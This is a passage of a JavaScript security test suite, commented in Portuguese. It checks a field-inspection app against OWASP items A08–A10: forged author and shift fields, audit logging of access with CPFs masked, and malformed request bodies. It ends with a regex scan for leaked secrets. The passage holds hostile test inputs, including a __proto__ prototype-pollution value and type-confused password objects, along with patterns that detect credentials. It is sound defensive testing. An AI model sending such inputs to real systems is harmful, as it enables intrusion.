  r = await post({ action: 'ping', key: S3.token }); ok(!r.ok, 'token não vale depois de a gerência gerar senha nova', r);
  r = await post({ action: 'entrar', matricula: 'inv.sessao', senha: S3.senha, aplicativo: 'campo' }); ok(!r.ok, 'a senha antiga não entra mais', r);
  const P = await post({ action: 'entrar', matricula: 'inv.sessao', senha: nova.senhaProvisoria, aplicativo: 'campo' });
  r = await post({ action: 'sync', key: P.token, since: 0 }); ok(!r.ok && r.trocarSenha === 1, 'com a senha provisória, nada além de trocar a senha', r);
  r = await post({ action: 'admDados', sessao: P.token }); ok(!r.ok && r.trocarSenha === 1, 'o portal também exige a troca', r);

  /* ================= A08 Falhas de integridade de software ou de dados ================= */
  console.log('A08 Integridade dos dados');
  const TF_M = uuid();
  await post({ action: 'sync', key: FA.token, since: 0, tfs: [{ id: TF_M, usuario: 'Outro Nome Ficticio', srv_ts: 1, doc: CPF, criadoEm: ag, atualizadoEm: ag }] });
  const tfM = (await linhasDe('TFs')).find(x => x.id === TF_M);
  ok(tfM && tfM.usuario === FA.usuario.nome && Number(tfM.srv_ts) > ag - 60000, 'o app não escolhe o autor (usuario) nem o carimbo do servidor (srv_ts)', tfM && [tfM.usuario, tfM.srv_ts]);
  const TURNO_M = uuid();
  await post({ action: 'sync', key: FA.token, since: 0, turnos: [{ id: TURNO_M, data: hoje, inicio: '06:00', fiscal: FA.usuario.nome, encerrado: 0, criadoEm: ag, atualizadoEm: ag,
    colegas: JSON.stringify(['Colega Forjado Teste']), encerradoPor: 'Gerencia Forjada Teste', encerradoEm: ag }] });
  const tM = (await linhasDe('Turnos')).find(x => x.id === TURNO_M);
  ok(tM && !tM.colegas && !tM.encerradoPor && !Number(tM.encerradoEm), 'turno novo: colegas e "encerrado por" só o servidor grava', tM && [tM.colegas, tM.encerradoPor]);
  r = await post({ action: 'painelEncerrarTurno', key: PL.token, turnoId: TURNO_A, fim: '12:00' });
  ok(!r.ok && Number((await linhasDe('Turnos')).find(x => x.id === TURNO_A).encerrado) !== 1, 'painel só de leitura não encerra turno', r);

  /* ================= A09 Falhas de registro e alerta ================= */
  console.log('A09 Registro e alerta');
  const X = await post({ action: 'usuarioCriar', key: G.token, matricula: 'inv.auditoria', nome: 'Auditoria Ficticia Teste', permissoes: ['campo'] });
  await post({ action: 'usuarioPermissoes', key: G.token, usuarioId: X.usuario.id, permissoes: ['campo', 'pce'] });
  await post({ action: 'usuarioNovaSenha', key: G.token, usuarioId: X.usuario.id });
  await post({ action: 'usuarioAtivar', key: G.token, usuarioId: X.usuario.id, ativo: 0 });
  const hist = (await linhasDe('HistoricoDeAlteracoes')).filter(h => h.registroId === X.usuario.id);
  const acoes = hist.map(h => h.acao);
  ok(['usuario.criar', 'usuario.permissoes', 'usuario.novaSenha', 'usuario.desativar'].every(a => acoes.includes(a)) && hist.every(h => h.usuarioId === G.usuario.id && Number(h.em) > 0),
    'toda mudança de acesso registra quem fez e quando', hist);
  r = await post({ action: 'tfConsultar', key: FA.token, doc: CPF });
  const cons = await linhasDe('Consultas');
  ok(r.ok && cons.some(c => c.usuario === FA.usuario.nome && c.doc === '529***25') && !JSON.stringify(cons).includes(CPF), 'consulta de CPF registrada com quem consultou e o CPF mascarado', cons.slice(-2));

  await post({ action: 'painelDados', key: G.token, de: hoje, ate: hoje });
  await post({ action: 'painelDados', key: G.token, de: hoje, ate: hoje, aoVivo: true });
  await post({ action: 'pceMapaGeral', key: FA.token });
  await post({ action: 'admDados', sessao: AD.token });
  const lidos = await linhasDe('AcessosADados');
  const de = (u, a) => lidos.filter(l => l.usuarioId === u.usuario.id && l.acao === a);
  ok(de(G, 'painelDados').length === 1 && de(FA, 'pceMapaGeral').length === 1 && de(AD, 'admDados').length === 1,
    'leitura de dados pessoais registra quem leu (uma linha por usuário e action por hora)', lidos.map(l => l.nome + ':' + l.acao));
  ok(!JSON.stringify(lidos).includes(CPF) && !JSON.stringify(lidos).includes(FISCALIZADO), 'registro de leitura sem dado pessoal');
  r = await post({ action: 'painelDados', key: PL.token, de: hoje });
  ok(r.ok && de(PL, 'painelDados').length === 0, 'leitura recusada ou de outro usuário não conta para este', r.erro);

  /* ================= A10 Condições excepcionais ================= */
  console.log('A10 Condições excepcionais');
  antes = await foto();
  const lixo = ['', 'não é json', '[]', 'null', '"texto"', '123', '{"action":{}}', '{"action":["sync"]}', '{"action":null}', '{'.repeat(5000),
    JSON.stringify({ action: 'sync', key: FA.token, turnos: 'texto', tfs: { id: 1 }, since: 'abc' }),
    JSON.stringify({ action: 'entrar', matricula: {}, senha: ['x'], aplicativo: 'campo' }),
    JSON.stringify({ action: 'entrar', matricula: 'inv.alfa', senha: { length: 99 }, aplicativo: 'campo' }),
    JSON.stringify({ action: 'tfVerificar', id: { toString: 1 } }), JSON.stringify({ action: 'painelDados', key: G.token, de: 'x', ate: { a: 1 }, ids: 'y' }),
    JSON.stringify({ action: 'usuarioPermissoes', key: G.token, usuarioId: FA.usuario.id, permissoes: 'gerencia' }),
    JSON.stringify({ action: 'arquivoEnviar', key: FA.token, arquivo: { id: 'x', dono: '__proto__', donoId: {}, tipo: 'foto', base64: 'a'.repeat(10) } })];
  const ruins = [];
  for (const b of lixo) {
    const x = await post(b);
    if (x.naoJson !== undefined || !semVazamento(x) || (x.ok && !/sync|painelDados/.test(b))) ruins.push(b.slice(0, 60) + ' → ' + JSON.stringify(x).slice(0, 150));
  }
  ok(!ruins.length, `${lixo.length} corpos malformados: resposta JSON com erro genérico, sem pilha`, ruins);
  ok((await foto()).length >= antes.length && (await post({ action: 'ping', key: FB.token })).ok, 'servidor continua respondendo');
  const usFA = (await linhasDe('PermissoesDosUsuarios')).filter(p => p.usuarioId === FA.usuario.id && !p.revogadaEm).map(p => p.permissao);
  ok(!usFA.includes('gerencia'), 'tipos errados não alteram permissões', usFA);
  r = await post({ action: 'entrar', matricula: 'inv.alfa', senha: { length: 99 }, aplicativo: 'campo' }); ok(!r.ok, 'senha que não é texto: recusada (falha fechada)', r);

  /* ================= varredura estática de segredos ================= */
  console.log('Segredos no repositório público');
  const fontes = [...arquivos(path.join(amb.RAIZ, 'web'), /\.(js|html|json|webmanifest)$/), ...arquivos(path.join(amb.RAIZ, 'apps-script'), /\.(gs|json)$/),
    ...arquivos(path.join(amb.RAIZ, 'docs'), /\.md$/)];
  const PADROES = [['chave de API do Google', /AIza[0-9A-Za-z_-]{35}/], ['token de sessão', /\bu\.[0-9a-f]{64}\b/], ['chave privada', /-----BEGIN [A-Z ]*PRIVATE KEY-----/],
    ['token do GitHub', /\bgh[pousr]_[A-Za-z0-9]{30,}/], ['ID da planilha fixo', /SHEET_ID['"]?\s*[:=,]\s*['"][A-Za-z0-9_-]{30,}['"]/], ['link da planilha', /docs\.google\.com\/spreadsheets\/d\/[A-Za-z0-9_-]{30,}/],
    ['hash bcrypt', /\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}/]];
  const achados = [];
  fontes.forEach(f => { if (/vendor|bcrypt\.gs$/.test(f)) return; const c = fs.readFileSync(f, 'utf8'); PADROES.forEach(([n, re]) => { if (re.test(c)) achados.push(n + ' em ' + path.relative(amb.RAIZ, f)); }); });
  ok(!achados.length, `nenhum segredo em ${fontes.length} arquivos de web/, apps-script/ e docs/`, achados);

  console.log('\nVulnerabilidades abertas conhecidas: ' + abertas.length + (abertas.length ? ' (' + abertas.join(', ') + ')' : ''));
  if (corrigidas.length) console.log('Corrigidas (tire de CONHECIDAS): ' + corrigidas.join(', '));
  console.log(falhas ? `FALHOU=${falhas}` : 'Tudo certo.');
  process.exitCode = falhas ? 1 : 0;
})().catch(e => { console.log('  ✗ erro: ' + (e && e.stack || e)); process.exitCode = 1; });
